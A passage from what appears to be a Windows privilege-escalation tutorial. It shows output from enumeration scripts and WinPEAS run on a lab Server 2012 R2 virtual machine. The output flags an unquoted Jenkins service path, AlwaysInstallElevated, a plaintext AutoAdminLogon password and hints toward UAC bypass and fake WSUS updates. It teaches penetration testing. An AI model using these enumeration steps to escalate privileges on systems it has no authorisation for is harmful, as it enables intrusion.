+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
+Run As User : SYSTEM
+Task To Run : %SystemRoot%\System32\wsqmcons.exe
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
+Run As User : Administrators
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Defrag\ScheduledDefrag
+Run As User : SYSTEM
+Task To Run : %windir%\system32\defrag.exe -c -h -k -g -$
+
+TaskName    : \Microsoft\Windows\Device Setup\Metadata Refresh
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\IME\SQM data sender
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
+Run As User : Administrators
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
+Run As User : Administrators
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
+Run As User : Administrators
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
+Run As User : Administrators
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic
+Run As User : Administrators
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MUI\LPRemove
+Run As User : SYSTEM
+Task To Run : %windir%\system32\lpremove.exe
+
+TaskName    : \Microsoft\Windows\Multimedia\SystemSoundsService
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\NetCfg\BindingWorkItemQueueHandler
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\NetTrace\GatherNetworkInfo
+Run As User : Users
+Task To Run : %windir%\system32\gatherNetworkInfo.vbs
+
+TaskName    : \Microsoft\Windows\Plug and Play\Device Install Reboot Required
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\RAC\RacTask
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\RAC\RacTask
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\RAC\RacTask
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Registry\RegIdleBackup
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
+Run As User : SYSTEM
+Task To Run : %systemroot%\system32\cscript.exe /B /nologo %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1)
+              $(Arg2)
+
+TaskName    : \Microsoft\Windows\Server Manager\ServerManager
+Run As User : Administrators
+Task To Run : %windir%\system32\ServerManagerLauncher.exe
+
+TaskName    : \Microsoft\Windows\Servicing\StartComponentCleanup
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Shell\CreateObjectTask
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Software Inventory Logging\Daily Collector
+Run As User : SYSTEM
+Task To Run : %systemroot%\system32\cscript.exe %systemroot%\system32\sildailycollector.vbs
+
+TaskName    : \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskLogon
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Optimization
+Run As User : SYSTEM
+Task To Run : %windir%\system32\defrag.exe -c -h -g -#
+
+TaskName    : \Microsoft\Windows\Task Manager\Interactive
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\TaskScheduler\Idle Maintenance
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\TaskScheduler\Manual Maintenance
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\TaskScheduler\Regular Maintenance
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Time Synchronization\SynchronizeTime
+Run As User : LOCAL SERVICE
+Task To Run : %windir%\system32\sc.exe start w32time task_started
+
+TaskName    : \Microsoft\Windows\Time Zone\SynchronizeTimeZone
+Run As User : SYSTEM
+Task To Run : %windir%\system32\tzsync.exe
+
+TaskName    : \Microsoft\Windows\WDI\ResolutionHost
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
+Run As User : Users
+Task To Run : %windir%\system32\wermgr.exe -queuereporting
+
+TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
+Run As User : Users
+Task To Run : %windir%\system32\wermgr.exe -queuereporting
+
+TaskName    : \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
+Run As User : SYSTEM
+Task To Run : %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange
+
+TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\AUScheduledInstall
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
+Run As User : SYSTEM
+Task To Run : C:\Windows\system32\sc.exe start wuauserv
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
+Run As User : SYSTEM
+Task To Run : C:\Windows\system32\sc.exe start wuauserv
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
+Run As User : SYSTEM
+Task To Run : C:\Windows\system32\sc.exe start wuauserv
+
+TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
+Run As User : SYSTEM
+Task To Run : C:\Windows\system32\sc.exe start wuauserv
+
+TaskName    : \Microsoft\Windows\Wininet\CacheTask
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Workplace Join\Automatic-Workplace-Join
+Run As User : Authenticated Users
+Task To Run : %SystemRoot%\System32\AutoWorkplace.exe join
+
+TaskName    : \Microsoft\Windows\WS\WSTask
+Run As User : SYSTEM
+Task To Run : COM handler
+
+-----------------------------------------------------------
+ Services
+-----------------------------------------------------------
+Name                     DisplayName                                             Status
+----                     -----------                                             ------
+ScDeviceEnum             Smart Card Device Enumeration Service                  Stopped
+SCPolicySvc              Smart Card Removal Policy                              Stopped
+SharedAccess             Internet Connection Sharing (ICS)                      Stopped
+SCardSvr                 Smart Card                                             Stopped
+RpcLocator               Remote Procedure Call (RPC) Locator                    Stopped
+RSoPProv                 Resultant Set of Policy Provider                       Stopped
+sacsvr                   Special Administration Console Helper                  Stopped
+SstpSvc                  Secure Socket Tunneling Protocol Service               Stopped
+svsvc                    Spot Verifier                                          Stopped
+swprv                    Microsoft Software Shadow Copy Provider                Stopped
+SSDPSRV                  SSDP Discovery                                         Stopped
+smphost                  Microsoft Storage Spaces SMP                           Stopped
+SNMPTRAP                 SNMP Trap                                              Stopped
+sppsvc                   Software Protection                                    Stopped
+Netman                   Network Connections                                    Stopped
+NetTcpPortSharing        Net.Tcp Port Sharing Service                           Stopped
+PerfHost                 Performance Counter DLL Host                           Stopped
+Netlogon                 Netlogon                                               Stopped
+msiserver                Windows Installer                                      Stopped
+napagent                 Network Access Protection Agent                        Stopped
+NcaSvc                   Network Connectivity Assistant                         Stopped
+reginasvc                Secure App Service                                     Stopped
+RemoteAccess             Routing and Remote Access                              Stopped
+RemoteRegistry           Remote Registry                                        Stopped
+RasMan                   Remote Access Connection Manager                       Stopped
+pla                      Performance Logs & Alerts                              Stopped
+PrintNotify              Printer Extensions and Notifications                   Stopped
+RasAuto                  Remote Access Auto Connection Manager                  Stopped
+WdiServiceHost           Diagnostic Service Host                                Stopped
+WdiSystemHost            Diagnostic System Host                                 Stopped
+Wecsvc                   Windows Event Collector                                Stopped
+WcsPlugInService         Windows Color System                                   Stopped
+vmicvss                  Hyper-V Volume Shadow Copy Requestor                   Stopped
+VSS                      Volume Shadow Copy                                     Stopped
+W32Time                  Windows Time                                           Stopped
+WPDBusEnum               Portable Device Enumerator Service                     Stopped
+WSService                Windows Store Service (WSService)                      Stopped
+wudfsvc                  Windows Driver Foundation - User-mode Driver Framework Stopped
+wmiApSrv                 WMI Performance Adapter                                Stopped
+WEPHOSTSVC               Windows Encryption Provider Host Service               Stopped
+wercplsupport            Problem Reports and Solutions Control Panel Support    Stopped
+WerSvc                   Windows Error Reporting Service                        Stopped
+UI0Detect                Interactive Services Detection                         Stopped
+unquosvc                 TH Application Service                                 Stopped
+upnphost                 UPnP Device Host                                       Stopped
+TieringEngineService     Storage Tiers Management                               Stopped
+SysMain                  Superfetch                                             Stopped
+TapiSrv                  Telephony                                              Stopped
+THREADORDER              Thread Ordering Server                                 Stopped
+vmicrdv                  Hyper-V Remote Desktop Virtualization Service          Stopped
+vmicshutdown             Hyper-V Guest Shutdown Service                         Stopped
+vmictimesync             Hyper-V Time Synchronization Service                   Stopped
+vmickvpexchange          Hyper-V Data Exchange Service                          Stopped
+vds                      Virtual Disk                                           Stopped
+vmicguestinterface       Hyper-V Guest Service Interface                        Stopped
+vmicheartbeat            Hyper-V Heartbeat Service                              Stopped
+DsmSvc                   Device Setup Manager                                   Stopped
+Eaphost                  Extensible Authentication Protocol                     Stopped
+EFS                      Encrypting File System (EFS)                           Stopped
+DeviceAssociationService Device Association Service                             Stopped
+DeviceInstall            Device Install Service                                 Stopped
+dot3svc                  Wired AutoConfig                                       Stopped
+AeLookupSvc              Application Experience                                 Stopped
+hidserv                  Human Interface Device Service                         Stopped
+hkmsvc                   Health Key and Certificate Management                  Stopped
+IEEtwCollectorService    Internet Explorer ETW Collector Service                Stopped
+fdPHost                  Function Discovery Provider Host                       Stopped
+FDResPub                 Function Discovery Resource Publication                Stopped
+filepermsvc              File Application Service                               Stopped
+dellasvc                 CkService                                              Stopped
+AppMgmt                  Application Management                                 Stopped
+AppReadiness             App Readiness                                          Stopped
+AppXSvc                  AppX Deployment Service (AppXSVC)                      Stopped
+ALG                      Application Layer Gateway Service                      Stopped
+AppIDSvc                 Application Identity                                   Stopped
+Appinfo                  Application Information                                Stopped
+AudioEndpointBuilder     Windows Audio Endpoint Builder                         Stopped
+COMSysApp                COM+ System Application                                Stopped
+daclasvc                 Clapplication                                          Stopped
+defragsvc                Optimize drives                                        Stopped
+Audiosrv                 Windows Audio                                          Stopped
+BITS                     Background Intelligent Transfer Service                Stopped
+Browser                  Computer Browser                                       Stopped
+lltdsvc                  Link-Layer Topology Discovery Mapper                   Stopped
+KPSSVC                   KDC Proxy Server service (KPS)                         Stopped
+MMCSS                    Multimedia Class Scheduler                             Stopped
+KeyIso                   CNG Key Isolation                                      Stopped
+KtmRm                    KtmRm for Distributed Transaction Coordinator          Stopped
+MSiSCSI                  Microsoft iSCSI Initiator Service                      Stopped
+CertPropSvc              Certificate Propagation                                Running
+LanmanWorkstation        Workstation                                            Running
+BrokerInfrastructure     Background Tasks Infrastructure Service                Running
+CryptSvc                 Cryptographic Services                                 Running
+PolicyAgent              IPsec Policy Agent                                     Running
+Power                    Power                                                  Running
+LanmanServer             Server                                                 Running
+VaultSvc                 Credential Manager                                     Running
+PlugPlay                 Plug and Play                                          Running
+DcomLaunch               DCOM Server Process Launcher                           Running
+WinRM                    Windows Remote Management (WS-Management)              Running
+Winmgmt                  Windows Management Instrumentation                     Running
+WinHttpAutoProxySvc      WinHTTP Web Proxy Auto-Discovery Service               Running
+MpsSvc                   Windows Firewall                                       Running
+EventLog                 Windows Event Log                                      Running
+wuauserv                 Windows Update                                         Running
+MSDTC                    Distributed Transaction Coordinator                    Running
+BFE                      Base Filtering Engine                                  Running
+nsi                      Network Store Interface Service                        Running
+Wcmsvc                   Windows Connection Manager                             Running
+NlaSvc                   Network Location Awareness                             Running
+LSM                      Local Session Manager                                  Running
+netprofm                 Network List Service                                   Running
+lmhosts                  TCP/IP NetBIOS Helper                                  Running
+ProfSvc                  User Profile Service                                   Running
+FontCache                Windows Font Cache Service                             Running
+ShellHWDetection         Shell Hardware Detection                               Running
+gpsvc                    Group Policy Client                                    Running
+jenkinsApache            jenkinsApache                                          Running
+Spooler                  Print Spooler                                          Running
+RpcSs                    Remote Procedure Call (RPC)                            Running
+SessionEnv               Remote Desktop Configuration                           Running
+Schedule                 Task Scheduler                                         Running
+IKEEXT                   IKE and AuthIP IPsec Keying Modules                    Running
+SamSs                    Security Accounts Manager                              Running
+SENS                     System Event Notification Service                      Running
+seclogon                 Secondary Logon                                        Running
+iphlpsvc                 IP Helper                                              Running
+RpcEptMapper             RPC Endpoint Mapper                                    Running
+UALSVC                   User Access Logging Service                            Running
+TrustedInstaller         Windows Modules Installer                              Running
+TrkWks                   Distributed Link Tracking Client                       Running
+Dhcp                     DHCP Client                                            Running
+UmRdpService             Remote Desktop Services UserMode Port Redirector       Running
+Dnscache                 DNS Client                                             Running
+DPS                      Diagnostic Policy Service                              Running
+jenkinsTomcat            jenkinsTomcat                                          Running
+jenkinsGradle            jenkinsGradle (managed by WinServ)                     Running
+EventSystem              COM+ Event System                                      Running
+Themes                   Themes                                                 Running
+TermService              Remote Desktop Services                                Running
+SystemEventsBroker       System Events Broker                                   Running
+
+
+-----------------------------------------------------------
+ Installed Programs
+-----------------------------------------------------------
+
+-----------------------------------------------------------
+ Installed Patches
+-----------------------------------------------------------
+
+-----------------------------------------------------------
+ Program Folders
+-----------------------------------------------------------
+
+C:\Program Files
+-------------
+AutoProgram
+Ckapplication
+Clapplication
+Common Files
+File Application Service
+Internet Explorer
+Secure App Service
+TH Application Service
+Windows Mail
+Windows NT
+WindowsPowerShell
+
+C:\Program Files (x86)
+-------------------
+Common Files
+Internet Explorer
+Microsoft.NET
+Windows Mail
+Windows NT
+WindowsPowerShell
+
+-----------------------------------------------------------
+ Files with Full Control and Modify Access
+-----------------------------------------------------------
+
+C:\Users\backup\Documents\SeriousSam\Invoke-Hivenightmare.ps1
+C:\Users\backup\Documents\jaws-enum.ps1
+C:\Users\backup\Documents\PowerUp-2.ps1
+C:\Users\backup\Documents\PowerUp-Old.ps1
+C:\Users\backup\Documents\PowerUP.ps1
+C:\Users\backup\Documents\PrivescCheck-last.ps1
+C:\Users\backup\Documents\PrivescCheck.ps1
+C:\Users\backup\Documents\Test.txt
+C:\Users\backup\Documents\WIN-EVAGJ1T16QD.backup.html
+C:\Users\backup\Documents\WinPEAS-Output.txt
+C:\Users\backup\Documents\WinPEAS.bat
+
+-----------------------------------------------------------
+ Folders with Full Control and Modify Access
+-----------------------------------------------------------
+Failed to read more folders
+
+Failed to read more folders
+
+-----------------------------------------------------------
+ Mapped Drives
+-----------------------------------------------------------
+C:
+D:
+
+-----------------------------------------------------------
+ Unquoted Service Paths
+-----------------------------------------------------------
+jenkinsTomcat                                           jenkinsTomcat             C:\Bitnami\JENKIN~1.1-0\APACHE~1\bin\
+tomcat8.exe //RS//jenkinsTomcat               Auto
+-----------------------------------------------------------
+ Recent Documents
+-----------------------------------------------------------
+
+AutomaticDestinations
+CustomDestinations
+Invoke-Hivenightmare.lnk
+New Text Document.txt.lnk
+PowerUp-2.txt.lnk
+PowerUp-Old.txt.lnk
+PowerUP.ps1.lnk
+PrivescCheck-last.ps1.lnk
+PrivescCheck.ps1.lnk
+PrivescCheck.txt.lnk
+SeriousSam.lnk
+Test.txt.lnk
+WIN-EVAGJ1T16QD.backup.html.lnk
+WinPEAS.txt.lnk
+
+-----------------------------------------------------------
+ Potentially Interesting Files in Users Directory
+-----------------------------------------------------------
+C:\Users\backup\Documents\SeriousSam\Invoke-Hivenightmare.ps1
+C:\Users\backup\Documents\jaws-enum.ps1
+C:\Users\backup\Documents\PowerUp-2.ps1
+C:\Users\backup\Documents\PowerUp-Old.ps1
+C:\Users\backup\Documents\PowerUP.ps1
+C:\Users\backup\Documents\PrivescCheck-last.ps1
+C:\Users\backup\Documents\PrivescCheck.ps1
+C:\Users\backup\Documents\Test.txt
+C:\Users\backup\Documents\WinPEAS-Output.txt
+C:\Users\backup\Documents\WinPEAS.bat
+
+-----------------------------------------------------------
+ 10 Last Modified Files in C:\User
+-----------------------------------------------------------
+C:\Users\backup\Documents\WinPEAS.bat
+C:\Users\backup\Documents\WinPEAS-Output.txt
+C:\Users\backup
+C:\Users\backup\Documents\sharpup.exe
+C:\Users\backup\Documents\winpeasx64.exe
+C:\Users\backup\Documents\Test.txt
+C:\Users\backup\Documents\jaws-enum.ps1
+C:\Users\backup\Documents
+C:\Users\backup\Documents\PrivescCheck.ps1
+C:\Users\backup\Documents\PrivescCheck-last.ps1
+
+-----------------------------------------------------------
+ MUICache Files
+-----------------------------------------------------------
+LangID
+C:\Windows\system32\NOTEPAD.EXE.FriendlyAppName
+C:\Windows\system32\NOTEPAD.EXE.ApplicationCompany
+C:\Program Files\Internet Explorer\iexplore.exe.FriendlyAppName
+C:\Program Files\Internet Explorer\iexplore.exe.ApplicationCompany
+C:\Windows\system32\mspaint.exe.FriendlyAppName
+C:\Windows\system32\mspaint.exe.ApplicationCompany
+C:\Program Files\Windows NT\Accessories\WORDPAD.EXE.FriendlyAppName
+C:\Program Files\Windows NT\Accessories\WORDPAD.EXE.ApplicationCompany
+
+-----------------------------------------------------------
+ System Files with Passwords
+-----------------------------------------------------------
+
+-----------------------------------------------------------
+ AlwaysInstalledElevated Registry Key
+-----------------------------------------------------------
+AlwaysInstallElevated enabled on this host!
+-----------------------------------------------------------
+ Stored Credentials
+-----------------------------------------------------------
+
+Currently stored credentials:
+
+* NONE *
+
+-----------------------------------------------------------
+ Checking for AutoAdminLogon
+-----------------------------------------------------------
+The default username is user
+The default password is password321
+The default domainname is
+
+PS C:\Users\backup\Documents>
+
+
+======================================================================================================================
+5. WinPEAS script
+======================================================================================================================
+
+Privilege escalation tools for Windows and Linux/Unix* and MacOS.
+
+Github link: 
+> https://github.com/carlospolop/PEASS-ng
+> https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+
+
+Example - Output of the WinPEAS.bat script run on a vulnerable Windows server 2012 R2 with a low-privileged user
+======================================================================================================================
+
+PS C:\Users\backup\Documents> .\WinPEAS.bat
+
+            ?[32m((,.,/((((((((((((((((((((/,  */?[97m
+     ?[32m,/*,..*(((((((((((((((((((((((((((((((((,?[97m
+   ?[32m,*/((((((((((((((((((/,  ?[92m.*//((//**,?[32m .*((((((*?[97m
+   ?[32m((((((((((((((((* ?[94m*****?[32m,,,/########## ?[32m.(* ,((((((?[97m
+   ?[32m(((((((((((/* ?[94m******************?[32m/####### ?[32m.(. ((((((?[97m
+   ?[32m((((((.?[92m.?[94m******************?[97m/@@@@@/?[94m***?[92m/######?[32m /((((((?[97m
+   ?[32m,,.?[92m.?[94m**********************?[97m@@@@@@@@@@(?[94m***?[92m,####?[32m ../(((((?[97m
+   ?[32m, ,?[92m?[94m**********************?[97m#@@@@@#@@@@?[94m*********?[92m##?[32m((/ /((((?[97m
+   ?[32m..((?[92m(##########?[94m*********?[97m/#@@@@@@@@@/?[94m*************?[32m,,..((((?[97m
+   ?[32m.((?[92m(################(/?[94m******?[97m/@@@@@#?[94m****************?[32m.. /((?[97m
+   ?[32m.(?[92m(########################(/?[94m************************?[32m..*(?[97m
+   ?[32m.(?[92m(#############################(/?[94m********************?[32m.,(?[97m
+   ?[32m.(?[92m(##################################(/?[94m***************?[32m..(?[97m
+   ?[32m.(?[92m(######################################(?[94m************?[32m..(?[97m
+   ?[32m.(?[92m(######(,.***.,(###################(..***(/?[94m*********?[32m..(?[97m
+   ?[32m.(?[92m(######*(#####((##################((######/(?[94m********?[32m..(?[97m
+   ?[32m.(?[92m(##################(/**********(################(?[94m**?[32m...(?[97m
+   ?[32m.((?[92m(####################/*******(###################?[32m.((((?[97m
+   ?[32m.((((?[92m(############################################/?[32m  /((?[97m
+   ?[32m..((((?[92m(#########################################(?[32m..(((((.?[97m
+   ?[32m....((((?[92m(#####################################(?[32m .((((((.?[97m
+   ?[32m......((((?[92m(#################################(?[32m .(((((((.?[97m
+   ?[32m(((((((((. ,?[92m(############################(?[32m../(((((((((.?[97m
+       ?[32m(((((((((/,  ?[92m,####################(?[32m/..((((((((((.?[97m
+             ?[32m(((((((((/,.  ?[92m,*//////*,.?[32m ./(((((((((((.?[97m
+                ?[32m(((((((((((((((((((((((((((/?[97m
+                       by carlospolop
+
+
+/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
+   ?[41mWinPEAS should be used for authorized penetration testing and/or educational purposes only.?[40;97m
+   ?[41mAny misuse of this software will not be the responsibility of the author or of any other collaborator.?[40;97m
+   ?[41mUse it at your own networks and/or with the network owner's permission.?[40;97m
+
+?[32m[*]?[97m BASIC SYSTEM INFO
+ ?[33m[+]?[97m WINDOWS OS
+   [i] Check for vulnerabilities for the OS version with the applied patches
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+
+Host Name:                 WIN-EVAGJ1T16QD
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00252-00110-49040-AA454
+Original Install Date:     6/12/2018, 4:12:08 AM
+System Boot Time:          8/14/2021, 10:20:58 AM
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1896 Mhz
+BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              fr;French (France)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     4,096 MB
+Available Physical Memory: 2,485 MB
+Virtual Memory: Max Size:  5,504 MB
+Virtual Memory: Available: 3,725 MB
+Virtual Memory: In Use:    1,779 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\WIN-EVAGJ1T16QD
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.1.254
+                                 IP address(es)
+                                 [01]: 192.168.1.50
+                                 [02]: fe80::55d7:c826:4294:b8ed
+                                 [03]: 2a01:e34:ec6f:d7e0:55d7:c826:4294:b8ed
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+No Instance(s) Available.
+
+
+ ?[33m[+]?[97m DATE and TIME
+   [i] You may need to adjust your local date/time to exploit some vulnerability
+Sat 08/14/2021
+11:45 AM
+
+ ?[33m[+]?[97m Audit Settings
+   [i] Check what is being logged
+
+ ?[33m[+]?[97m WEF Settings
+   [i] Check where are being sent the logs
+
+ ?[33m[+]?[97m LAPS installed?
+   [i] Check what is being logged
+
+ ?[33m[+]?[97m LSA protection?
+   [i] Active if "1"
+
+ ?[33m[+]?[97m Credential Guard?
+   [i] Active if "1" or "2"
+
+ ?[33m[+]?[97m WDigest?
+   [i] Plain-text creds in memory if "1"
+
+ ?[33m[+]?[97m Number of cached creds
+   [i] You need System-rights to extract them
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    CACHEDLOGONSCOUNT    REG_SZ    10
+
+ ?[33m[+]?[97m UAC Settings
+   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
+
+
+ ?[33m[+]?[97m Registered Anti-Virus(AV)
+ERROR:
+Description = Invalid namespace
+
+Checking for defender whitelisted PATHS
+ ?[33m[+]?[97m PowerShell settings
+PowerShell v2 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+    PowerShellVersion    REG_SZ    2.0
+
+PowerShell v5 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
+    PowerShellVersion    REG_SZ    4.0
+
+Transcriptions Settings:
+Module logging settings:
+Scriptblog logging settings:
+
+PS default transcript history
+
+Checking PS history file
+
+ ?[33m[+]?[97m MOUNTED DISKS
+   [i] Maybe you find something interesting Caption
+C:
+D:
+
+ ?[33m[+]?[97m ENVIRONMENT
+   [i] Interesting information?
+
+ALLUSERSPROFILE=C:\ProgramData
+APPDATA=C:\Users\backup\AppData\Roaming
+CommonProgramFiles=C:\Program Files\Common Files
+CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+CommonProgramW6432=C:\Program Files\Common Files
+COMPUTERNAME=WIN-EVAGJ1T16QD
+ComSpec=C:\Windows\system32\cmd.exe
+CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
+E=0x1B[
+expl=no
+FP_NO_HOST_CHECK=NO
+HOMEDRIVE=C:
+HOMEPATH=\Users\backup
+LOCALAPPDATA=C:\Users\backup\AppData\Local
+LOGONSERVER=\\WIN-EVAGJ1T16QD
+long=false
+NUMBER_OF_PROCESSORS=1
+OS=Windows_NT
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Temp;C:\Temp
+
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+Percentage=1
+PercentageTrack=19
+PROCESSOR_ARCHITECTURE=AMD64
+PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 142 Stepping 10, GenuineIntel
+PROCESSOR_LEVEL=6
+PROCESSOR_REVISION=8e0a
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PROMPT=$P$G
+PSExecutionPolicyPreference=Bypass
+PSModulePath=C:\Users\backup\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\s
+ystem32\WindowsPowerShell\v1.0\Modules\
+PUBLIC=C:\Users\Public
+SESSIONNAME=Console
+SystemDrive=C:
+SystemRoot=C:\Windows
+TEMP=C:\Users\backup\AppData\Local\Temp\1
+TMP=C:\Users\backup\AppData\Local\Temp\1
+USERDOMAIN=WIN-EVAGJ1T16QD
+USERDOMAIN_ROAMINGPROFILE=WIN-EVAGJ1T16QD
+USERNAME=backup
+USERPROFILE=C:\Users\backup
+windir=C:\Windows
+
+ ?[33m[+]?[97m INSTALLED SOFTWARE
+   [i] Some weird software? Check for vulnerabilities in unknow software installed
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
+
+AutoProgram
+Ckapplication
+Clapplication
+Common Files
+Common Files
+File Application Service
+Internet Explorer
+Internet Explorer
+Microsoft.NET
+Secure App Service
+TH Application Service
+Windows Mail
+Windows Mail
+Windows NT
+Windows NT
+WindowsPowerShell
+WindowsPowerShell
+    InstallLocation    REG_SZ    C:\Bitnami\jenkins-2.121.1-0
+
+ ?[33m[+]?[97m Remote Desktop Credentials Manager
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
+
+ ?[33m[+]?[97m WSUS
+   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+
+ ?[33m[+]?[97m RUNNING PROCESSES
+   [i] Something unexpected is running? Check for vulnerabilities
